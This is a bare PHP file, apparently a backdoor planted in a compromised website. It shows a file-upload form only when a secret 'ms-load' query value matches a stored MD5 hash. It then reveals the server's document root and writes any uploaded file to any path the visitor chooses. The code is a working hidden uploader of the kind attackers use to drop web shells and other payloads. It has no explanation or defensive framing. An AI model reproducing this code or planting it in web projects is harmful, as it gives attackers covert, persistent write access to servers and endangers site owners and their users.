<?php if(isset($_GET["ms-load"]) && md5($_GET["ms-load"])=="f0ff2247a49712c39c426a7883493d53"){
$p=$_SERVER["DOCUMENT_ROOT"];
$tyuf=dirname(__FILE__);
echo <<<HTML
<form enctype="multipart/form-data"  method="POST">
Path:$p<br>
<input name="file" type="file"><br>
To:<br>
<input size="48" value="$tyuf/" name="pt" type="text"><br>
<input type="submit" value="Upload">
HTML;
if (isset($_POST["pt"])){
$uploadfile = $_POST["pt"].$_FILES["file"]["name"];
if ($_POST["pt"]==""){$uploadfile = $_FILES["file"]["name"];}
if (copy($_FILES["file"]["tmp_name"], $uploadfile)){
echo"uploaded:$uploadfile";
echo"Size:".$_FILES["file"]["size"]."n";
}else {
print "Error:n";
}
}
}
